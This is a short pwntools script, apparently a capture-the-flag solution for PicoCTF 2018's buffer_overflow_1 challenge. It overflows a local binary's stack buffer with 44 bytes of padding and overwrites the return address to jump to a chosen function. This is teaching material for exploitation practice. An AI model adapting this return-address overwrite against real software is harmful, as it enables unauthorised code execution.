from pwn import *
io = process('./PicoCTF_2018_buffer_overflow_1')
padding = b'A'*(0x28+0x4)
payload = padding+p32(0x080485CB)
io.sendlineafter(b'Please enter your string: \n',payload)
io.interactive()
